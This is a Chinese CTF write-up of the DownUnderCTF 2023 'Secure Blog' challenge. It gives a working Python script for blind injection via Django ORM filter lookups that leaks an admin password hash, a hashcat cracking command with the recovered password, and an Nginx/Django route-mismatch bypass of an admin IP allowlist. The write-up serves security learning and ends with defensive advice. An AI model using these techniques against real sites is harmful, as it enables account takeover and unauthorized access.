# DownUnderCTF 2023 Secure Blog Writeup

## 题目简述

目标由 Nginx 和 Django REST Framework 组成。获取 flag 需要完成两段攻击：先利用不安全的 Django ORM 动态过滤做布尔盲注，泄露并破解管理员 `jeff` 的密码哈希；再利用 Nginx 与 Django 的正则路由差异绕过 `/admin` 的本地 IP 白名单。

官方 WP 中的录屏和截图只展示命令输出、403 页面、绕过后的登录页及后台 flag。其关键信息均可准确转写为文本，因此没有保留这些低视觉信息量资源。

## 解题过程

文章查询接口直接把 JSON 请求体展开成 ORM 条件：

```python
def post(self, request, format=None):
    articles = Article.objects.filter(**request.data)
    return Response(ArticleSerializer(articles, many=True).data)
```

`Article.created_by` 是指向 Django `User` 的外键。Django 的双下划线查找语法既能跨关系访问 `created_by.password`，又能注入 `startswith` 条件。可以发送：

```json
{
  "created_by__username": "jeff",
  "created_by__password__startswith": "pbkdf2_sha256$a"
}
```

若前缀正确，接口返回 Jeff 创建的两篇文章；错误则返回空数组。逐位测试字符集 `_$\/=+0123456789a-zA-Z`，即可形成布尔盲注：

```python
import string
import requests

target = "http://TARGET/api/articles/?format=json"
alphabet = "_$/=+" + string.digits + string.ascii_letters
known = "pbkdf2_sha256$"

while True:
    for char in alphabet:
        response = requests.post(target, json={
            "created_by__username": "jeff",
            "created_by__password__startswith": known + char,
        })
        if len(response.json()) > 0:
            known += char
            print(known)
            break
    else:
        break
```

恢复出的完整哈希为：

```text
pbkdf2_sha256$1000$057C2I2qdGH98Hm2CSkiKZ$6Eq+K931+YFv4OV578LDDDyFoWEp2OClbcnRF1qxHjE=
```

题目自定义 hasher 只使用 1000 次 PBKDF2-SHA256，便于字典破解。Hashcat 模式 10000 配合 `rockyou.txt` 可得到：

```bash
hashcat -m 10000 jeff.hash rockyou.txt
```

```text
jeff:shrekndonkey
```

直接访问 `/admin` 会命中 Nginx 的内层规则并返回 403：

```nginx
location ~ ^/(api|admin) {
    location ~ ^/admin {
        allow 127.0.0.1;
        deny all;
    }
    proxy_pass http://127.0.0.1:8000;
}
```

但 Django 路由使用未锚定的 `re_path`：

```python
urlpatterns = [
    re_path('admin/', admin.site.urls),
    re_path('api/articles/', ArticleView.as_view()),
]
```

访问 `/apiadmin/` 时，Nginx 看到路径以 `/api` 开头，进入代理块；它不以 `/admin` 开头，因此绕过 IP 限制。Django 的正则搜索又能在 `apiadmin/` 中匹配到 `admin/`，于是请求进入后台。使用 `jeff:shrekndonkey` 登录后，还需把 Django 后续生成的 `/admin/...` 重定向继续改写为 `/apiadmin/...`。进入 `App -> Flags -> Top Secret Flag` 后得到：

```text
DUCTF{oRm_i_g0oF3d_uP_m1_r3lAsHunSh1p5!}
```

## 方法总结

第一段漏洞来自把用户 JSON 当作 ORM 查询语言，关系字段和 lookup 后缀把普通筛选接口升级成敏感字段盲读；第二段来自两个组件对同一路径采用不同的匹配锚点。防御时既要为查询字段和操作符建立白名单，也要让反向代理与应用使用一致、完整锚定的后台路由。
